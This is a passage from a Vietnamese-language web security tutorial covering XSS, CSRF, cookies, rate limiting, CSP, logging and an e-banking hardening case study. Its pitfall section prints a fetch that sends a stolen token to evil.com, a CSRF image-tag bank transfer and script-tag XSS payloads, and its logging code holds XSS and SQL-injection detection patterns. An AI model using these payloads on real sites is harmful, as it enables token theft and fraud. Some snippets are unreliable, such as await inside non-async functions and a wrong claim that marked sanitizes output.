  // 💡 secure: Cookie chỉ gửi qua HTTPS → An toàn

  sameSite: 'strict', // ✅ Chống CSRF
  // 💡 sameSite: 'strict' → Cookie chỉ gửi cho same-site requests
  // 💡 Request từ evil.com → Browser KHÔNG gửi cookie → CSRF thất bại
});
// Client: Không cần làm gì, browser tự động gửi cookie
// 💡 Browser tự động gửi cookie với mọi request → Không cần code gì thêm
// 💡 UX tốt: User không cần làm gì, tự động authenticated

// ❌ LỖI 2: Không sanitize user input (XSS Attack!)
// Vấn đề: User nhập <script>alert('XSS')</script> → script chạy
function Comment({ content }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />; // ❌ Nguy hiểm!
  // 💡 ⚠️ NGUY HIỂM: Render HTML trực tiếp không sanitize
  // 💡 User input: <script>alert('XSS')</script> → Script chạy → XSS attack!
  // 💡 Hậu quả: Steal cookies, redirect, keylog...
}

// ✅ CÁCH SỬA: Dùng DOMPurify sanitize
import DOMPurify from 'dompurify'; // 📦 Library sanitize HTML

function Comment({ content }) {
  const clean = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'], // ✅ Chỉ cho phép tags an toàn
    // 💡 ALLOWED_TAGS: Whitelist các thẻ HTML được phép
    // 💡 'b', 'i', 'em', 'strong': Format text → An toàn
    // 💡 <script>, <iframe>, <img onerror>... → Bị xóa

    ALLOWED_ATTR: [], // 🚫 Không cho phép attributes
    // 💡 ALLOWED_ATTR: Whitelist các attributes được phép
    // 💡 []: Không cho phép attributes nào → An toàn nhất
    // 💡 onerror, onclick, onload... → Bị xóa
  });
  // 💡 DOMPurify.sanitize(): Loại bỏ script tags và attributes nguy hiểm
  // 💡 Kết quả: HTML an toàn, không có script

  return <div dangerouslySetInnerHTML={{ __html: clean }} />; // ✅ An toàn
  // 💡 clean: HTML đã được sanitize → Không có script → An toàn
}

// ❌ LỖI 3: Không có CSRF protection (CSRF Attack!)
// Vấn đề: Hacker lừa user click link → browser gửi request kèm cookies
fetch('/api/transfer', {
  method: 'POST',
  body: JSON.stringify({ amount: 1000 }),
}); // ❌ Thiếu CSRF token
// 💡 ⚠️ NGUY HIỂM: Request không có CSRF token
// 💡 Hacker: <img src="https://bank.com/transfer?amount=10000&to=hacker">
// 💡 User click → Browser gửi request kèm cookies → Chuyển tiền cho hacker!

// ✅ CÁCH SỬA: Gửi CSRF token
// 1. 🔑 Lấy token từ server
const csrfToken = await fetch('/api/csrf-token').then((r) => r.json());
// 💡 Gọi endpoint để lấy CSRF token
// 💡 Server tạo token ngẫu nhiên, lưu trong session
// 💡 Client nhận token → Lưu vào state/memory

// 2. 📤 Gửi token cùng request
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken.token, // ✅ Gửi token trong header
    // 💡 X-CSRF-Token: Custom header chứa CSRF token
    // 💡 Server verify token → Khớp mới xử lý request
  },
  body: JSON.stringify({
    amount: 1000,
    csrfToken: csrfToken.token, // ✅ Cũng gửi trong body (double check)
    // 💡 Gửi cả header và body → Double check → An toàn hơn
  }),
});
// 💡 Server verify: Token từ header/body vs Token trong session
// 💡 Không khớp → Reject → CSRF attack thất bại ✅

// ❌ LỖI 4: Password yếu
// Vấn đề: Password ngắn → dễ brute-force
const isValid = password.length >= 6; // ❌ Quá yếu (123456, password)

// ✅ CÁCH SỬA: Password policy mạnh
// Regex: Ít nhất 12 ký tự, có chữ thường, chữ hoa, số, ký tự đặc biệt
const passwordRegex =
  /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{12,}$/;

function validatePassword(password: string): boolean {
  if (!passwordRegex.test(password)) {
    throw new Error(
      'Password phải có ít nhất 12 ký tự, bao gồm chữ hoa, chữ thường, số và ký tự đặc biệt'
    );
  }
  return true;
}

// VD: "Pass123!" → ❌ Fail (chỉ 8 ký tự)
//     "MySecurePass123!" → ✅ Pass

// ❌ LỖI 5: Không có rate limiting
// Vấn đề: Hacker thử 1 triệu passwords trong vài phút
app.post('/api/login', async (req, res) => {
  // ❌ Không giới hạn → brute-force dễ dàng
  const user = await authenticateUser(req.body);
  res.json(user);
});

// ✅ CÁCH SỬA: Thêm rate limiting
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 phút
  max: 5, // Chỉ cho 5 lần thử
  message: 'Quá nhiều lần thử login, vui lòng thử lại sau 15 phút',
});

app.post('/api/login', loginLimiter, async (req, res) => {
  // ✅ Giới hạn 5 lần/15 phút → brute-force khó hơn
  const user = await authenticateUser(req.body);
  res.json(user);
});

// ❌ LỖI 6: Hardcode secrets trong code
// Vấn đề: Secret bị lộ khi push lên GitHub
const JWT_SECRET = 'my-secret-key-123'; // ❌ Nguy hiểm!
const API_KEY = 'sk_live_abc123xyz'; // ❌ Lộ API key

// ✅ CÁCH SỬA: Dùng environment variables
// File: .env
// JWT_SECRET=randomly-generated-secure-key-xyz789
// API_KEY=sk_live_abc123xyz

// Code:
const JWT_SECRET = process.env.JWT_SECRET; // ✅ Đọc từ env
const API_KEY = process.env.API_KEY;

// .gitignore phải có .env để không commit secrets

// ❌ LỖI 7: CORS wildcard trong production
// Vấn đề: Cho phép mọi domain call API
app.use(cors({ origin: '*' })); // ❌ Mọi domain đều gọi được

// ✅ CÁCH SỬA: Whitelist domains cụ thể
app.use(
  cors({
    origin: ['https://yourdomain.com', 'https://app.yourdomain.com'], // ✅ Chỉ cho phép domains này
    credentials: true,
  })
);
```

**Monitoring & Logging (Giám Sát & Ghi Log Bảo Mật):**

```typescript
// ✅ Security Event Logging System
// Mục đích: Phát hiện và theo dõi các hoạt động bất thường

import winston from 'winston'; // Thư viện logging mạnh mẽ

// Cấu hình logger
const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    // Ghi vào file
    new winston.transports.File({ filename: 'security.log' }),
    // Gửi đến service giám sát (VD: Elasticsearch, Datadog)
    new winston.transports.Http({ host: 'logs.example.com' }),
  ],
});

// 1. Log Failed Login Attempts (Lần Thử Login Thất Bại)
// Phát hiện brute-force attack
function logFailedLogin(email: string, ip: string, timestamp: Date) {
  securityLogger.warn({
    event: 'FAILED_LOGIN',
    email,
    ip,
    timestamp,
    message: `Thử login thất bại: ${email} từ IP ${ip}`,
  });

  // Kiểm tra số lần thử thất bại
  const failedAttempts = await getFailedAttempts(ip, email);

  if (failedAttempts >= 5) {
    securityLogger.error({
      event: 'BRUTE_FORCE_DETECTED',
      email,
      ip,
      attempts: failedAttempts,
      message: `⚠️ Phát hiện brute-force: ${failedAttempts} lần thử từ ${ip}`,
    });

    // Block IP tạm thời
    await blockIP(ip, 3600); // Block 1 giờ

    // Gửi alert cho security team
    await sendAlert('security@example.com', `Brute-force detected: ${ip}`);
  }
}

// 2. Log Suspicious Activity (Hoạt Động Đáng Ngờ)
// VD: User truy cập nhiều accounts, transfer số tiền bất thường
function logSuspiciousActivity(userId: string, action: string, details: any) {
  securityLogger.warn({
    event: 'SUSPICIOUS_ACTIVITY',
    userId,
    action,
    details,
    timestamp: new Date(),
    message: `Hoạt động đáng ngờ: User ${userId} - ${action}`,
  });

  // VD: Transfer số tiền lớn bất thường
  if (action === 'LARGE_TRANSFER' && details.amount > 100000) {
    // Gửi OTP xác nhận
    await sendOTP(userId);

    // Alert security team
    await sendAlert(
      'security@example.com',
      `Large transfer detected: User ${userId} - $${details.amount}`
    );
  }
}

// 3. Log XSS Attempts (Thử Tấn Công XSS)
// Phát hiện khi user nhập script tags hoặc malicious code
function logXSSAttempt(input: string, ip: string, userId?: string) {
  // Detect script tags hoặc javascript: protocol
  const xssPattern = /<script|javascript:|onerror=|onclick=/i;

  if (xssPattern.test(input)) {
    securityLogger.error({
      event: 'XSS_ATTEMPT',
      ip,
      userId: userId || 'anonymous',
      input: input.substring(0, 200), // Chỉ log 200 ký tự đầu
      timestamp: new Date(),
      message: `⚠️ Phát hiện XSS attempt từ IP ${ip}`,
    });

    // Block IP ngay lập tức
    await blockIP(ip, 86400); // Block 24 giờ

    // Alert admin
    await sendAlert(
      'admin@example.com',
      `XSS attempt from ${ip}: ${input.substring(0, 100)}...`
    );
  }
}

// 4. Log SQL Injection Attempts
function logSQLInjectionAttempt(query: string, ip: string) {
  const sqlPattern = /(\bOR\b|\bAND\b).*=.*|UNION|DROP|DELETE|INSERT/i;

  if (sqlPattern.test(query)) {
    securityLogger.error({
      event: 'SQL_INJECTION_ATTEMPT',
      ip,
      query: query.substring(0, 200),
      timestamp: new Date(),
      message: `⚠️ SQL injection attempt từ ${ip}`,
    });

    await blockIP(ip, 86400);
  }
}

// 5. Log Authentication Events
function logAuthEvent(
  event: string,
  userId: string,
  ip: string,
  success: boolean
) {
  securityLogger.info({
    event: 'AUTH_EVENT',
    type: event, // 'LOGIN', 'LOGOUT', 'TOKEN_REFRESH', 'PASSWORD_CHANGE'
    userId,
    ip,
    success,
    timestamp: new Date(),
    message: `${event}: User ${userId} từ ${ip} - ${
      success ? 'Thành công' : 'Thất bại'
    }`,
  });
}

// 6. Real-time Monitoring Dashboard
// Hiển thị logs real-time cho security team
import { Server } from 'socket.io';

const io = new Server(server);

// Gửi security events real-time đến dashboard
securityLogger.on('data', (logEntry) => {
  if (logEntry.level === 'error' || logEntry.level === 'warn') {
    // Emit đến security dashboard
    io.to('security-room').emit('security-alert', logEntry);
  }
});

// Dashboard component (React)
function SecurityDashboard() {
  const [alerts, setAlerts] = useState<any[]>([]);

  useEffect(() => {
    const socket = io('wss://your-server.com');
    socket.emit('join', 'security-room');

    socket.on('security-alert', (alert) => {
      setAlerts((prev) => [alert, ...prev].slice(0, 100)); // Keep 100 alerts

      // Play sound for critical alerts
      if (
        alert.event === 'BRUTE_FORCE_DETECTED' ||
        alert.event === 'XSS_ATTEMPT'
      ) {
        playAlertSound();
      }
    });

    return () => socket.disconnect();
  }, []);

  return (
    <div className="security-dashboard">
      <h2>🛡️ Security Monitoring Dashboard</h2>
      {alerts.map((alert, i) => (
        <div key={i} className={`alert alert-${alert.level}`}>
          <span className="time">{alert.timestamp}</span>
          <span className="event">{alert.event}</span>
          <span className="message">{alert.message}</span>
        </div>
      ))}
    </div>
  );
}

// 📊 METRICS TRACKING (Theo dõi chỉ số)
interface SecurityMetrics {
  totalRequests: number;
  failedLogins: number;
  xssAttempts: number;
  sqlInjectionAttempts: number;
  blockedIPs: number;
}

// Track metrics theo thời gian
const metrics: SecurityMetrics = {
  totalRequests: 0,
  failedLogins: 0,
  xssAttempts: 0,
  sqlInjectionAttempts: 0,
  blockedIPs: 0,
};

// Gửi metrics đến monitoring service (VD: Prometheus, Grafana)
setInterval(() => {
  sendMetrics('security.metrics', metrics);
  console.log('📊 Security Metrics:', metrics);
}, 60000); // Mỗi phút
```

---

## **⚠️ 4. CÁC LỖI THƯỜNG GẶP (PITFALLS)**

### **❌ Pitfall #1: Lưu sensitive data trong localStorage**

**Lỗi phổ biến:**

```typescript
// ❌ NGUY HIỂM: XSS có thể đánh cắp token
localStorage.setItem('authToken', token);
localStorage.setItem('userPassword', password);

// Hacker inject XSS:
fetch('https://evil.com/steal?token=' + localStorage.getItem('authToken'));
```

**Tại sao nguy hiểm:**

- Bất kỳ JavaScript nào (kể cả từ third-party scripts) đều access được
- XSS attack dễ dàng steal data
- Data persist ngay cả khi đóng browser

**✅ Giải pháp:**

```typescript
// ✅ Dùng HttpOnly cookies
// Backend set cookie:
res.cookie('authToken', token, {
  httpOnly: true, // JavaScript không access được
  secure: true, // Chỉ gửi qua HTTPS
  sameSite: 'strict', // Ngăn CSRF
  maxAge: 15 * 60 * 1000, // 15 phút
});

// Frontend: Cookie tự động gửi với mọi request, không cần code
```

---

### **❌ Pitfall #2: Client-side validation only**

**Lỗi phổ biến:**

```typescript
// ❌ Chỉ validate ở client
function submitForm(data) {
  if (data.age < 18) {
    alert('Must be 18+');
    return;
  }
  // Gửi trực tiếp lên server
  api.post('/register', data);
}
```

**Tại sao nguy hiểm:**

- Hacker bypass dễ dàng bằng DevTools/Postman
- Gửi request trực tiếp với data độc hại

**✅ Giải pháp:**

```typescript
// ✅ Validate cả client VÀ server
// Client (UX tốt):
if (data.age < 18) {
  alert('Must be 18+');
  return;
}

// Server (SECURITY):
app.post('/register', (req, res) => {
  const { age, email } = req.body;

  // Server-side validation
  if (age < 18) {
    return res.status(400).json({ error: 'Must be 18+' });
  }

  if (!isValidEmail(email)) {
    return res.status(400).json({ error: 'Invalid email' });
  }

  // Sanitize input
  const sanitized = DOMPurify.sanitize(email);

  // Proceed...
});
```

---

### **❌ Pitfall #3: Không set CSP headers**

**Lỗi phổ biến:**

```html
<!-- Không có CSP header → inline scripts chạy tự do -->
<script>
  eval(userInput); // NGUY HIỂM!
</script>

<script src="https://untrusted-cdn.com/malicious.js"></script>
```

**Hậu quả:**

- XSS attacks dễ thành công
- Third-party scripts có thể inject malicious code
- Không kiểm soát được nguồn resources

**✅ Giải pháp:**

```typescript
// Backend: Set CSP header
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'self'", // Mặc định chỉ same-origin
      "script-src 'self' https://trusted-cdn.com", // Chỉ scripts từ whitelist
      "style-src 'self' 'unsafe-inline'", // CSS (unsafe-inline cho styled-components)
      "img-src 'self' data: https:", // Images
      "connect-src 'self' https://api.example.com", // Fetch/XHR
      "font-src 'self' https://fonts.gstatic.com", // Fonts
      "object-src 'none'", // Block plugins (Flash, Java)
      "base-uri 'self'", // Ngăn <base> tag attacks
      "form-action 'self'", // Forms chỉ submit đến same-origin
      "frame-ancestors 'none'", // Không cho embed trong iframe
      'upgrade-insecure-requests', // Auto upgrade HTTP → HTTPS
    ].join('; ')
  );
  next();
});
```

**CSP Report-Only mode (để test trước):**

```typescript
// Chỉ log violations, không block (để test CSP rules)
res.setHeader(
  'Content-Security-Policy-Report-Only',
  "default-src 'self'; report-uri /csp-violation-report"
);

// Endpoint nhận CSP violations
app.post('/csp-violation-report', (req, res) => {
  console.log('CSP Violation:', req.body);
  // Log để phân tích và fix CSP rules
  res.status(204).end();
});
```

---

### **❌ Pitfall #4: Hardcode secrets trong code**

**Lỗi phổ biến:**

```typescript
// ❌ NGUY HIỂM: Secrets exposed trong source code
const API_KEY = 'sk_live_abc123xyz789';
const DB_PASSWORD = 'admin1234';

fetch('https://api.stripe.com/charge', {
  headers: { Authorization: `Bearer ${API_KEY}` },
});
```

**Tại sao nguy hiểm:**

- Source code có thể bị leak (GitHub, logs)
- Bundle JavaScript chứa secrets (inspect trong DevTools)
- Không rotate secrets được

**✅ Giải pháp:**

```typescript
// ✅ Dùng environment variables
// .env.local (KHÔNG commit vào Git)
VITE_API_URL=https://api.example.com
API_SECRET=sk_live_abc123xyz789  // Backend only
DATABASE_URL=postgres://user:pass@host/db  // Backend only

// Frontend (Vite)
const apiUrl = import.meta.env.VITE_API_URL;  // Public OK
// ❌ KHÔNG expose secrets ở frontend

// Backend
const apiSecret = process.env.API_SECRET;  // Server-side only

// .gitignore
.env.local
.env.*.local
```

**Secrets management tools:**

- **AWS Secrets Manager**: Auto rotate secrets
- **HashiCorp Vault**: Centralized secrets
- **Azure Key Vault**: Microsoft cloud secrets
- **Doppler**: Secrets sync across environments

---

### **❌ Pitfall #5: Không implement rate limiting**

**Lỗi phổ biến:**

```typescript
// ❌ Không giới hạn requests
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await db.findUser(username);

  if (user && bcrypt.compare(password, user.password)) {
    res.json({ token: generateToken(user) });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Hacker có thể brute-force: thử 10,000 passwords/giây
```

**Hậu quả:**

- Brute-force attacks
- DDoS dễ dàng
- Server overload

**✅ Giải pháp:**

```typescript
// ✅ Rate limiting với express-rate-limit
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';
import Redis from 'ioredis';

const redis = new Redis(process.env.REDIS_URL);

// Strict rate limit cho login
const loginLimiter = rateLimit({
  store: new RedisStore({
    client: redis,
    prefix: 'rate_limit:login:',
  }),
  windowMs: 15 * 60 * 1000, // 15 phút
  max: 5, // Max 5 attempts
  message: 'Too many login attempts, please try again after 15 minutes',
  standardHeaders: true,
  legacyHeaders: false,
  // Skip successful logins
  skipSuccessfulRequests: true,
});

app.post('/api/login', loginLimiter, async (req, res) => {
  // Login logic...
});

// General API rate limit
const apiLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 phút
  max: 100, // Max 100 requests/phút
  message: 'Too many requests from this IP',
});

app.use('/api/', apiLimiter);
```

---

### **❌ Pitfall #6: Dùng eval() hoặc dangerouslySetInnerHTML không an toàn**

**Lỗi phổ biến:**

```typescript
// ❌ NGUY HIỂM
const userCode = req.body.code;
eval(userCode); // Hacker có thể chạy bất kỳ code nào!

// React
<div dangerouslySetInnerHTML={{ __html: userComment }} />;
// Nếu userComment chứa <script>alert('xss')</script> → XSS
```

**✅ Giải pháp:**

```typescript
// ✅ Sanitize trước khi render
import DOMPurify from 'dompurify';

const sanitized = DOMPurify.sanitize(userComment, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
  ALLOWED_ATTR: ['href'],
  ALLOW_DATA_ATTR: false,
});

<div dangerouslySetInnerHTML={{ __html: sanitized }} />;

// ✅ Tốt hơn: Dùng markdown library (remark, marked)
import { marked } from 'marked';
const html = marked.parse(userMarkdown); // Auto sanitize
```

---

## **🔄 5. SO SÁNH VỚI KỸ THUẬT KHÁC**

### **🆚 Authentication Methods Comparison**

| Method                     | Security   | UX         | Use Case             | Pros                                                     | Cons                                                              |
| -------------------------- | ---------- | ---------- | -------------------- | -------------------------------------------------------- | ----------------------------------------------------------------- |
| **Session Cookies**        | ⭐⭐⭐⭐   | ⭐⭐⭐⭐   | Traditional web apps | • Stateful tracking<br>• Easy revoke<br>• Server control | • Server storage overhead<br>• Scaling challenges<br>• CSRF risk  |
| **JWT (Access + Refresh)** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Modern SPAs, mobile  | • Stateless<br>• Scalable<br>• Cross-domain              | • Cannot revoke easily<br>• Token size larger                     |
| **OAuth 2.0**              | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐   | Third-party login    | • Delegated auth<br>• No password storage                | • Complex flow<br>• Provider dependency                           |
| **Basic Auth**             | ⭐⭐       | ⭐⭐       | Internal tools, APIs | • Simple<br>• Wide support                               | • Credentials in every request<br>• No logout<br>• HTTPS required |
| **API Keys**               | ⭐⭐⭐     | ⭐⭐⭐     | Server-to-server     | • Simple<br>• Easy rotate                                | • No user context<br>• Static credentials                         |

**Recommendation:**

- **SPAs/Mobile**: JWT (access 15min + refresh 7 days in HttpOnly cookie)
- **Traditional Web**: Session cookies với Redis store
- **Social Login**: OAuth 2.0 + OIDC
- **Internal APIs**: API keys + IP whitelist

---

### **🆚 XSS Prevention Techniques**

| Technique             | Effectiveness | Performance | Effort     | When to Use                     |
| --------------------- | ------------- | ----------- | ---------- | ------------------------------- |
| **React Auto-Escape** | ⭐⭐⭐⭐      | ⭐⭐⭐⭐⭐  | ⭐⭐⭐⭐⭐ | Always (default React behavior) |
| **DOMPurify**         | ⭐⭐⭐⭐⭐    | ⭐⭐⭐⭐    | ⭐⭐⭐⭐   | When rendering user HTML        |
| **CSP Headers**       | ⭐⭐⭐⭐⭐    | ⭐⭐⭐⭐⭐  | ⭐⭐⭐     | Always (defense in depth)       |
| **Input Validation**  | ⭐⭐⭐        | ⭐⭐⭐⭐    | ⭐⭐⭐     | Server-side + Client-side       |
| **Output Encoding**   | ⭐⭐⭐⭐      | ⭐⭐⭐⭐⭐  | ⭐⭐⭐⭐   | When displaying user content    |
| **HttpOnly Cookies**  | ⭐⭐⭐⭐⭐    | ⭐⭐⭐⭐⭐  | ⭐⭐⭐⭐⭐ | For auth tokens                 |

**Best Practice:** Combine multiple layers

```typescript
// Layer 1: React auto-escape
<div>{userInput}</div>

// Layer 2: DOMPurify for rich text
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />

// Layer 3: CSP header
Content-Security-Policy: default-src 'self'; script-src 'self'

// Layer 4: HttpOnly cookies
Set-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict
```

---

### **🆚 Storage Security Comparison**

| Storage                  | XSS Risk      | CSRF Risk        | Persistence     | Capacity  | Best For            |
| ------------------------ | ------------- | ---------------- | --------------- | --------- | ------------------- |
| **HttpOnly Cookie**      | ✅ Safe       | ⚠️ Need SameSite | Until expiry    | 4KB       | Auth tokens         |
| **localStorage**         | ❌ Vulnerable | ✅ Safe          | Forever         | 5-10MB    | Non-sensitive cache |
| **sessionStorage**       | ❌ Vulnerable | ✅ Safe          | Until tab close | 5-10MB    | Temporary UI state  |
| **IndexedDB**            | ❌ Vulnerable | ✅ Safe          | Forever         | 50MB+     | Large datasets      |
| **Memory (React state)** | ✅ Safe       | ✅ Safe          | Until refresh   | Unlimited | Runtime data        |

**Decision Tree:**

```
Is data sensitive (token, password, PII)?
├─ YES → HttpOnly Cookie hoặc Memory only
└─ NO → Can use localStorage/sessionStorage
    ├─ Need after browser close? → localStorage
    └─ Temporary? → sessionStorage
```

---

## **🏢 6. SCENARIO THỰC TẾ DỰ ÁN LỚN**

### **📱 Case Study: E-Banking Application Security**

**Project Context:**

- **Company**: Ngân hàng số với 2M+ users
- **Platform**: React SPA + Node.js backend
- **Sensitive Data**: Tài khoản, số dư, giao dịch, OTP
- **Compliance**: PCI-DSS, SOC 2, GDPR
- **Team**: 15 engineers, bạn là Tech Lead Security

**Initial Security Audit Results:**

```
🔴 Critical Issues Found:
1. Access tokens trong localStorage (XSS risk)
2. Không có rate limiting (brute-force possible)
3. CSP headers missing (XSS unprotected)
4. Passwords send over HTTP trong staging
5. Third-party scripts không verify (SRI missing)
6. CORS wildcard '*' cho production API
7. Sensitive data log trong console.log
8. Outdated dependencies (23 vulnerabilities)
```

**Security Implementation Plan:**

#### **Phase 1: Critical Fixes (Week 1-2)**

**1. Migrate từ localStorage → HttpOnly Cookies**

```typescript
// ❌ Before: localStorage
localStorage.setItem('accessToken', token);
localStorage.setItem('refreshToken', refreshToken);

// ✅ After: HttpOnly Cookies
// Backend (Express)
app.post('/api/login', async (req, res) => {
  const { accessToken, refreshToken } = await authenticateUser(req.body);

  // Access token: 15 phút
  res.cookie('accessToken', accessToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000,
  });

  // Refresh token: 7 ngày
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000,
    path: '/api/auth/refresh', // Chỉ gửi đến refresh endpoint
  });

  res.json({ success: true });
});

// Frontend: Axios auto include cookies
axios.defaults.withCredentials = true;
```

**Impact:** ✅ Eliminated XSS token theft risk

---

**2. Implement Rate Limiting**

```typescript
// Redis-backed rate limiting
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';

const loginLimiter = rateLimit({
  store: new RedisStore({ client: redisClient }),
  windowMs: 15 * 60 * 1000,
  max: 5,
  skipSuccessfulRequests: true,
  handler: (req, res) => {
    logger.warn('Rate limit exceeded', {
      ip: req.ip,
      endpoint: req.path,
    });
    res.status(429).json({
      error: 'Too many attempts. Account locked for 15 minutes.',
    });
  },
});

app.post('/api/login', loginLimiter, loginHandler);

// Transaction rate limit (stricter)
const transactionLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 10, // Max 10 transactions/phút
  keyGenerator: (req) => req.user.id, // Per user
});

app.post('/api/transfer', transactionLimiter, transferHandler);
```

**Impact:** ✅ Blocked 10,000+ brute-force attempts/day

---

**3. Deploy CSP Headers**

```typescript
// Strict CSP cho banking app
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'none'", // Deny all by default
      "script-src 'self'", // Only bundled scripts
      "style-src 'self' 'unsafe-inline'", // CSS (inline needed for React)
      "img-src 'self' data: https://cdn.bank.com", // Images
      "font-src 'self'",
      "connect-src 'self' https://api.bank.com", // API calls
      "frame-src 'none'", // No iframes
      "object-src 'none'", // No plugins
      "base-uri 'self'",
      "form-action 'self'",
      'upgrade-insecure-requests',
      'block-all-mixed-content',
    ].join('; ')
  );
  next();
});
```

**Impact:** ✅ Reduced XSS attack surface by 95%

---

#### **Phase 2: Enhanced Security (Week 3-4)**

**4. HTTPS Everywhere + HSTS**

```nginx
# Nginx config
server {
  listen 80;
  server_name bank.com www.bank.com;
  return 301 https://$server_name$request_uri;  # Redirect HTTP → HTTPS
}

server {
  listen 443 ssl http2;
  server_name bank.com;

  # SSL/TLS configuration
  ssl_certificate /path/to/fullchain.pem;
  ssl_certificate_key /path/to/privkey.pem;
  ssl_protocols TLSv1.2 TLSv1.3;
  ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
  ssl_prefer_server_ciphers on;

  # HSTS: Force HTTPS for 2 years
  add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

  # Other security headers
  add_header X-Frame-Options "DENY" always;
  add_header X-Content-Type-Options "nosniff" always;
  add_header Referrer-Policy "strict-origin-when-cross-origin" always;
}
```

**Impact:** ✅ 100% traffic encrypted, MITM attacks prevented

---

**5. Input Validation & Sanitization**

```typescript
// Zod schemas cho validation
import { z } from 'zod';

const transferSchema = z.object({
  toAccount: z
    .string()
    .regex(/^\d{10,16}$/, 'Invalid account number')
    .refine(async (acc) => await accountExists(acc), 'Account not found'),

  amount: z
    .number()
    .positive('Amount must be positive')
    .max(1000000, 'Daily limit exceeded')
    .multipleOf(0.01, 'Invalid amount precision'),

  otp: z
    .string()
    .length(6, 'OTP must be 6 digits')
    .regex(/^\d{6}$/, 'OTP must be numeric'),

  description: z
    .string()
    .max(200, 'Description too long')
    .transform((val) => DOMPurify.sanitize(val)), // Auto sanitize
});

app.post('/api/transfer', async (req, res) => {
  try {
    // Validate + sanitize
    const validated = await transferSchema.parseAsync(req.body);

    // Additional server-side checks
    const balance = await getBalance(req.user.id);
    if (balance < validated.amount) {
      return res.status(400).json({ error: 'Insufficient funds' });
    }

    // Verify OTP
    const otpValid = await verifyOTP(req.user.id, validated.otp);
    if (!otpValid) {
      return res.status(401).json({ error: 'Invalid OTP' });
    }

    // Process transfer
    await processTransfer(validated);

    res.json({ success: true });
  } catch (error) {
    if (error instanceof z.ZodError) {
      return res.status(400).json({ errors: error.errors });
    }
    throw error;
  }
});
```

**Impact:** ✅ Blocked 500+ injection attempts/day

---

**6. Dependency Security Scanning**

```json
// package.json scripts
{
  "scripts": {
    "audit": "npm audit --audit-level=moderate",
    "audit:fix": "npm audit fix",
    "security:check": "snyk test",
    "security:monitor": "snyk monitor"
  }
}
```

```yaml
# GitHub Actions: .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Run Snyk Security Scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

      - name: npm audit
        run: npm audit --audit-level=high

      - name: OWASP Dependency Check
        uses: dependency-check/Dependency-Check_Action@main
```

**Impact:** ✅ Auto-detect vulnerable dependencies, 23 → 0 vulnerabilities

---

#### **Phase 3: Monitoring & Compliance (Week 5-6)**

**7. Security Logging & Monitoring**

```typescript
// Winston logger với security events
import winston from 'winston';

const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({
      filename: 'security-events.log',
      level: 'warn',
    }),
    new winston.transports.Console({
      format: winston.format.simple(),
    }),
  ],
});

// Middleware log security events
app.use((req, res, next) => {
  const startTime = Date.now();

  res.on('finish', () => {
    const duration = Date.now() - startTime;

    // Log suspicious activities
    if (res.statusCode === 401 || res.statusCode === 403) {
      securityLogger.warn('Unauthorized access attempt', {
        ip: req.ip,
        user: req.user?.id,
        endpoint: req.path,
        method: req.method,
        statusCode: res.statusCode,
        timestamp: new Date().toISOString(),
      });
    }

    // Log slow requests (possible DDoS)
    if (duration > 5000) {
      securityLogger.warn('Slow request detected', {
        ip: req.ip,
        endpoint: req.path,
        duration,
        timestamp: new Date().toISOString(),
      });
    }
  });

  next();
});

// Alert cho critical events
function alertSecurityTeam(event) {
  // Send to Slack/PagerDuty/Email
  fetch(process.env.SLACK_WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      text: `🚨 Security Alert: ${event.type}`,
      attachments: [
        {
          color: 'danger',
          fields: [
            { title: 'IP', value: event.ip },
            { title: 'User', value: event.user },
            { title: 'Timestamp', value: event.timestamp },
          ],
        },
      ],
    }),
  });
}

// Detect brute-force patterns
const failedLoginAttempts = new Map();

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await authenticateUser(username, password);

  if (!user) {
    // Track failed attempts
    const attempts = failedLoginAttempts.get(req.ip) || 0;
    failedLoginAttempts.set(req.ip, attempts + 1);

    if (attempts >= 5) {
      // Alert security team
      alertSecurityTeam({
        type: 'Brute-force attempt',
        ip: req.ip,
        username,
        attempts,
        timestamp: new Date().toISOString(),
      });
    }

    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Reset on successful login
  failedLoginAttempts.delete(req.ip);

  // ... generate tokens ...
});
```

**Impact:**

- ✅ Real-time alerts cho suspicious activities
- ✅ Detected và blocked 50+ attack campaigns
- ✅ Compliance với PCI-DSS logging requirements

---

**8. Penetration Testing Results**

**Before Security Implementation:**

```
🔴 Critical: 8 findings
🟠 High: 15 findings
